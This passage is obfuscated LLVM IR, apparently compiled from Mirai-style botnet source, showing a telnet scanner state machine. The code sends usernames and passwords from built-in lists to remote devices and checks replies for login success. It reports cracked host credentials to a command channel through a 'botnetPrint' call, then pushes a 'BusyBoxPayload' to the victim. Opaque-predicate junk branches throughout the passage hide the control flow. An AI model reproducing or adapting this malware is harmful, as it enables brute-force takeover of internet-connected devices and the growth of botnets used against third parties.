  %731 = load i32, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %732
  call void @reset_telstate(%struct.telstate_t* %733)
  br label %734

; <label>:734:                                    ; preds = %730, %originalBBpart2140
  br label %1290

; <label>:735:                                    ; preds = %originalBBpart231
  %736 = load i32, i32* %5, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 0
  %740 = load i32, i32* %739, align 16
  %741 = load i32, i32* %5, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 4
  %745 = load i8, i8* %744, align 2
  %746 = zext i8 %745 to i64
  %747 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %746
  %748 = load i8*, i8** %747, align 8
  %749 = load i32, i32* %5, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 4
  %753 = load i8, i8* %752, align 2
  %754 = zext i8 %753 to i64
  %755 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %754
  %756 = load i8*, i8** %755, align 8
  %757 = call i64 @strlen(i8* %756) #9
  %758 = call i64 @send(i32 %740, i8* %748, i64 %757, i32 16384)
  %759 = icmp slt i64 %758, 0
  br i1 %759, label %760, label %780

; <label>:760:                                    ; preds = %735
  %761 = load i32, i32* @x.77
  %762 = load i32, i32* @y.78
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %760
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %770
  call void @reset_telstate(%struct.telstate_t* %771)
  %772 = load i32, i32* @x.77
  %773 = load i32, i32* @y.78
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1291

; <label>:780:                                    ; preds = %735
  %781 = load i32, i32* @x.77
  %782 = load i32, i32* @y.78
  %783 = sub i32 %781, 1
  %784 = mul i32 %781, %783
  %785 = urem i32 %784, 2
  %786 = icmp eq i32 %785, 0
  %787 = icmp slt i32 %782, 10
  %788 = or i1 %786, %787
  br i1 %788, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %780
  %789 = load i32, i32* %5, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 0
  %793 = load i32, i32* %792, align 16
  %794 = call i64 @send(i32 %793, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %795 = icmp slt i64 %794, 0
  %796 = load i32, i32* @x.77
  %797 = load i32, i32* @y.78
  %798 = sub i32 %796, 1
  %799 = mul i32 %796, %798
  %800 = urem i32 %799, 2
  %801 = icmp eq i32 %800, 0
  %802 = icmp slt i32 %797, 10
  %803 = or i1 %801, %802
  br i1 %803, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %795, label %804, label %808

; <label>:804:                                    ; preds = %originalBBpart2148
  %805 = load i32, i32* %5, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %806
  call void @reset_telstate(%struct.telstate_t* %807)
  br label %1291

; <label>:808:                                    ; preds = %originalBBpart2148
  %809 = load i32, i32* %5, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %810
  call void @advance_state(%struct.telstate_t* %811, i32 4)
  br label %1290

; <label>:812:                                    ; preds = %originalBBpart231
  %813 = load i32, i32* %5, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 0
  %817 = load i32, i32* %816, align 16
  %818 = load i32, i32* %3, align 4
  %819 = load i32, i32* %5, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 9
  %823 = load i8*, i8** %822, align 8
  %824 = call i32 @read_until_response(i32 %817, i32 %818, i8* %823, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %825 = icmp ne i32 %824, 0
  br i1 %825, label %826, label %859

; <label>:826:                                    ; preds = %812
  %827 = load i32, i32* @x.77
  %828 = load i32, i32* @y.78
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %826
  %835 = load i32, i32* %5, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 9
  %839 = load i8*, i8** %838, align 8
  %840 = call i32 @contains_fail(i8* %839)
  %841 = icmp ne i32 %840, 0
  %842 = load i32, i32* @x.77
  %843 = load i32, i32* @y.78
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %841, label %850, label %854

; <label>:850:                                    ; preds = %originalBBpart2152
  %851 = load i32, i32* %5, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %852
  call void @advance_state(%struct.telstate_t* %853, i32 0)
  br label %858

; <label>:854:                                    ; preds = %originalBBpart2152
  %855 = load i32, i32* %5, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %856
  call void @advance_state(%struct.telstate_t* %857, i32 5)
  br label %858

; <label>:858:                                    ; preds = %854, %850
  br label %1291

; <label>:859:                                    ; preds = %812
  %860 = load i32, i32* %5, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 7
  %864 = load i32, i32* %863, align 16
  %865 = add i32 %864, 3
  %866 = zext i32 %865 to i64
  %867 = call i64 @time(i64* null) #3
  %868 = icmp slt i64 %866, %867
  br i1 %868, label %869, label %873

; <label>:869:                                    ; preds = %859
  %870 = load i32, i32* %5, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %871
  call void @reset_telstate(%struct.telstate_t* %872)
  br label %873

; <label>:873:                                    ; preds = %869, %859
  br label %1290

; <label>:874:                                    ; preds = %originalBBpart231
  %875 = load i32, i32* %5, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %876
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %877, i32 0, i32 0
  %879 = load i32, i32* %878, align 16
  %880 = load i32, i32* %5, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 5
  %884 = load i8, i8* %883, align 1
  %885 = zext i8 %884 to i64
  %886 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %885
  %887 = load i8*, i8** %886, align 8
  %888 = load i32, i32* %5, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %889
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %890, i32 0, i32 5
  %892 = load i8, i8* %891, align 1
  %893 = zext i8 %892 to i64
  %894 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %893
  %895 = load i8*, i8** %894, align 8
  %896 = call i64 @strlen(i8* %895) #9
  %897 = call i64 @send(i32 %879, i8* %887, i64 %896, i32 16384)
  %898 = icmp slt i64 %897, 0
  br i1 %898, label %899, label %919

; <label>:899:                                    ; preds = %874
  %900 = load i32, i32* @x.77
  %901 = load i32, i32* @y.78
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %899
  %908 = load i32, i32* %5, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %909
  call void @reset_telstate(%struct.telstate_t* %910)
  %911 = load i32, i32* @x.77
  %912 = load i32, i32* @y.78
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1291

; <label>:919:                                    ; preds = %874
  %920 = load i32, i32* @x.77
  %921 = load i32, i32* @y.78
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %919
  %928 = load i32, i32* %5, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 0
  %932 = load i32, i32* %931, align 16
  %933 = call i64 @send(i32 %932, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %934 = icmp slt i64 %933, 0
  %935 = load i32, i32* @x.77
  %936 = load i32, i32* @y.78
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %934, label %943, label %963

; <label>:943:                                    ; preds = %originalBBpart2160
  %944 = load i32, i32* @x.77
  %945 = load i32, i32* @y.78
  %946 = sub i32 %944, 1
  %947 = mul i32 %944, %946
  %948 = urem i32 %947, 2
  %949 = icmp eq i32 %948, 0
  %950 = icmp slt i32 %945, 10
  %951 = or i1 %949, %950
  br i1 %951, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %943
  %952 = load i32, i32* %5, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %953
  call void @reset_telstate(%struct.telstate_t* %954)
  %955 = load i32, i32* @x.77
  %956 = load i32, i32* @y.78
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1291

; <label>:963:                                    ; preds = %originalBBpart2160
  %964 = load i32, i32* @x.77
  %965 = load i32, i32* @y.78
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %963
  %972 = load i32, i32* %5, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %973
  call void @advance_state(%struct.telstate_t* %974, i32 6)
  %975 = load i32, i32* @x.77
  %976 = load i32, i32* @y.78
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1290

; <label>:983:                                    ; preds = %originalBBpart231
  %984 = load i32, i32* @x.77
  %985 = load i32, i32* @y.78
  %986 = sub i32 %984, 1
  %987 = mul i32 %984, %986
  %988 = urem i32 %987, 2
  %989 = icmp eq i32 %988, 0
  %990 = icmp slt i32 %985, 10
  %991 = or i1 %989, %990
  br i1 %991, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %983
  %992 = load i32, i32* %5, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 16
  %997 = load i32, i32* %3, align 4
  %998 = load i32, i32* %5, align 4
  %999 = sext i32 %998 to i64
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %999
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1000, i32 0, i32 9
  %1002 = load i8*, i8** %1001, align 8
  %1003 = call i32 @read_until_response(i32 %996, i32 %997, i8* %1002, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1004 = icmp ne i32 %1003, 0
  %1005 = load i32, i32* @x.77
  %1006 = load i32, i32* @y.78
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1004, label %1013, label %1116

; <label>:1013:                                   ; preds = %originalBBpart2172
  %1014 = call i64 @time(i64* null) #3
  %1015 = trunc i64 %1014 to i32
  %1016 = load i32, i32* %5, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 7
  store i32 %1015, i32* %1019, align 16
  %1020 = load i32, i32* %5, align 4
  %1021 = sext i32 %1020 to i64
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1021
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1022, i32 0, i32 9
  %1024 = load i8*, i8** %1023, align 8
  %1025 = call i32 @contains_fail(i8* %1024)
  %1026 = icmp ne i32 %1025, 0
  br i1 %1026, label %1027, label %1031

; <label>:1027:                                   ; preds = %1013
  %1028 = load i32, i32* %5, align 4
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1029
  call void @advance_state(%struct.telstate_t* %1030, i32 0)
  br label %1099

; <label>:1031:                                   ; preds = %1013
  %1032 = load i32, i32* %5, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 9
  %1036 = load i8*, i8** %1035, align 8
  %1037 = call i32 @contains_success(i8* %1036)
  %1038 = icmp ne i32 %1037, 0
  br i1 %1038, label %1039, label %1094

; <label>:1039:                                   ; preds = %1031
  %1040 = load i32, i32* %5, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 3
  %1044 = load i8, i8* %1043, align 1
  %1045 = zext i8 %1044 to i32
  %1046 = icmp eq i32 %1045, 2
  br i1 %1046, label %1047, label %1051

; <label>:1047:                                   ; preds = %1039
  %1048 = load i32, i32* %5, align 4
  %1049 = sext i32 %1048 to i64
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1049
  call void @advance_state(%struct.telstate_t* %1050, i32 7)
  br label %1077

; <label>:1051:                                   ; preds = %1039
  %1052 = load i32, i32* @KadenCommStock, align 4
  %1053 = load i32, i32* %5, align 4
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1054
  %1056 = call i8* @get_telstate_host(%struct.telstate_t* %1055)
  %1057 = load i32, i32* %5, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 4
  %1061 = load i8, i8* %1060, align 2
  %1062 = zext i8 %1061 to i64
  %1063 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %1062
  %1064 = load i8*, i8** %1063, align 8
  %1065 = load i32, i32* %5, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 5
  %1069 = load i8, i8* %1068, align 1
  %1070 = zext i8 %1069 to i64
  %1071 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %1070
  %1072 = load i8*, i8** %1071, align 8
  %1073 = call i32 (i32, i8*, ...) @botnetPrint(i32 %1052, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.97, i32 0, i32 0), i8* %1056, i8* %1064, i8* %1072)
  %1074 = load i32, i32* %5, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1075
  call void @advance_state(%struct.telstate_t* %1076, i32 7)
  br label %1077

; <label>:1077:                                   ; preds = %1051, %1047
  %1078 = load i32, i32* @x.77
  %1079 = load i32, i32* @y.78
  %1080 = sub i32 %1078, 1
  %1081 = mul i32 %1078, %1080
  %1082 = urem i32 %1081, 2
  %1083 = icmp eq i32 %1082, 0
  %1084 = icmp slt i32 %1079, 10
  %1085 = or i1 %1083, %1084
  br i1 %1085, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1077
  %1086 = load i32, i32* @x.77
  %1087 = load i32, i32* @y.78
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1098

; <label>:1094:                                   ; preds = %1031
  %1095 = load i32, i32* %5, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1096
  call void @reset_telstate(%struct.telstate_t* %1097)
  br label %1098

; <label>:1098:                                   ; preds = %1094, %originalBBpart2176
  br label %1099

; <label>:1099:                                   ; preds = %1098, %1027
  %1100 = load i32, i32* @x.77
  %1101 = load i32, i32* @y.78
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1099
  %1108 = load i32, i32* @x.77
  %1109 = load i32, i32* @y.78
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1291

; <label>:1116:                                   ; preds = %originalBBpart2172
  %1117 = load i32, i32* %5, align 4
  %1118 = sext i32 %1117 to i64
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 7
  %1121 = load i32, i32* %1120, align 16
  %1122 = add i32 %1121, 7
  %1123 = zext i32 %1122 to i64
  %1124 = call i64 @time(i64* null) #3
  %1125 = icmp slt i64 %1123, %1124
  br i1 %1125, label %1126, label %1130

; <label>:1126:                                   ; preds = %1116
  %1127 = load i32, i32* %5, align 4
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1128
  call void @reset_telstate(%struct.telstate_t* %1129)
  br label %1130

; <label>:1130:                                   ; preds = %1126, %1116
  br label %1290

; <label>:1131:                                   ; preds = %originalBBpart231
  %1132 = call i64 @time(i64* null) #3
  %1133 = trunc i64 %1132 to i32
  %1134 = load i32, i32* %5, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 7
  store i32 %1133, i32* %1137, align 16
  %1138 = load i32, i32* %5, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 16
  %1143 = call i64 @send(i32 %1142, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.98, i32 0, i32 0), i64 4, i32 16384)
  %1144 = icmp slt i64 %1143, 0
  br i1 %1144, label %1145, label %1146

; <label>:1145:                                   ; preds = %1131
  br label %1146

; <label>:1146:                                   ; preds = %1145, %1131
  %1147 = load i32, i32* @x.77
  %1148 = load i32, i32* @y.78
  %1149 = sub i32 %1147, 1
  %1150 = mul i32 %1147, %1149
  %1151 = urem i32 %1150, 2
  %1152 = icmp eq i32 %1151, 0
  %1153 = icmp slt i32 %1148, 10
  %1154 = or i1 %1152, %1153
  br i1 %1154, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1146
  %1155 = load i32, i32* %5, align 4
  %1156 = sext i32 %1155 to i64
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1156
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1157, i32 0, i32 0
  %1159 = load i32, i32* %1158, align 16
  %1160 = call i64 @send(i32 %1159, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.99, i32 0, i32 0), i64 7, i32 16384)
  %1161 = icmp slt i64 %1160, 0
  %1162 = load i32, i32* @x.77
  %1163 = load i32, i32* @y.78
  %1164 = sub i32 %1162, 1
  %1165 = mul i32 %1162, %1164
  %1166 = urem i32 %1165, 2
  %1167 = icmp eq i32 %1166, 0
  %1168 = icmp slt i32 %1163, 10
  %1169 = or i1 %1167, %1168
  br i1 %1169, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1161, label %1170, label %1171

; <label>:1170:                                   ; preds = %originalBBpart2184
  br label %1171

; <label>:1171:                                   ; preds = %1170, %originalBBpart2184
  %1172 = load i32, i32* @x.77
  %1173 = load i32, i32* @y.78
  %1174 = sub i32 %1172, 1
  %1175 = mul i32 %1172, %1174
  %1176 = urem i32 %1175, 2
  %1177 = icmp eq i32 %1176, 0
  %1178 = icmp slt i32 %1173, 10
  %1179 = or i1 %1177, %1178
  br i1 %1179, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1171
  %1180 = load i32, i32* %5, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 0
  %1184 = load i32, i32* %1183, align 16
  %1185 = load i8*, i8** @BusyBoxPayload, align 8
  %1186 = load i8*, i8** @BusyBoxPayload, align 8
  %1187 = call i64 @strlen(i8* %1186) #9
  %1188 = call i64 @send(i32 %1184, i8* %1185, i64 %1187, i32 16384)
  %1189 = icmp slt i64 %1188, 0
  %1190 = load i32, i32* @x.77
  %1191 = load i32, i32* @y.78
  %1192 = sub i32 %1190, 1
  %1193 = mul i32 %1190, %1192
  %1194 = urem i32 %1193, 2
  %1195 = icmp eq i32 %1194, 0
  %1196 = icmp slt i32 %1191, 10
  %1197 = or i1 %1195, %1196
  br i1 %1197, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br i1 %1189, label %1198, label %1218

; <label>:1198:                                   ; preds = %originalBBpart2188
  %1199 = load i32, i32* @x.77
  %1200 = load i32, i32* @y.78
  %1201 = sub i32 %1199, 1
  %1202 = mul i32 %1199, %1201
  %1203 = urem i32 %1202, 2
  %1204 = icmp eq i32 %1203, 0
  %1205 = icmp slt i32 %1200, 10
  %1206 = or i1 %1204, %1205
  br i1 %1206, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1198
  %1207 = load i32, i32* %5, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1208
  call void @reset_telstate(%struct.telstate_t* %1209)
  %1210 = load i32, i32* @x.77
  %1211 = load i32, i32* @y.78
  %1212 = sub i32 %1210, 1
  %1213 = mul i32 %1210, %1212
  %1214 = urem i32 %1213, 2
  %1215 = icmp eq i32 %1214, 0
  %1216 = icmp slt i32 %1211, 10
  %1217 = or i1 %1215, %1216
  br i1 %1217, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1291

; <label>:1218:                                   ; preds = %originalBBpart2188
  %1219 = load i32, i32* @x.77
  %1220 = load i32, i32* @y.78
  %1221 = sub i32 %1219, 1
  %1222 = mul i32 %1219, %1221
  %1223 = urem i32 %1222, 2
  %1224 = icmp eq i32 %1223, 0
  %1225 = icmp slt i32 %1220, 10
  %1226 = or i1 %1224, %1225
  br i1 %1226, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1218
  %1227 = load i32, i32* %5, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1228
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1229, i32 0, i32 7
  %1231 = load i32, i32* %1230, align 16
  %1232 = add i32 %1231, 25
  %1233 = zext i32 %1232 to i64
  %1234 = call i64 @time(i64* null) #3
  %1235 = icmp slt i64 %1233, %1234
  %1236 = load i32, i32* @x.77
  %1237 = load i32, i32* @y.78
  %1238 = sub i32 %1236, 1
  %1239 = mul i32 %1236, %1238
  %1240 = urem i32 %1239, 2
  %1241 = icmp eq i32 %1240, 0
  %1242 = icmp slt i32 %1237, 10
  %1243 = or i1 %1241, %1242
  br i1 %1243, label %originalBBpart2206, label %originalBB194alteredBB

originalBBpart2206:                               ; preds = %originalBB194
  br i1 %1235, label %1244, label %1289

; <label>:1244:                                   ; preds = %originalBBpart2206
  %1245 = load i32, i32* @x.77
  %1246 = load i32, i32* @y.78
  %1247 = sub i32 %1245, 1
  %1248 = mul i32 %1245, %1247
  %1249 = urem i32 %1248, 2
  %1250 = icmp eq i32 %1249, 0
  %1251 = icmp slt i32 %1246, 10
  %1252 = or i1 %1250, %1251
  br i1 %1252, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %1244
  %1253 = load i32, i32* %5, align 4
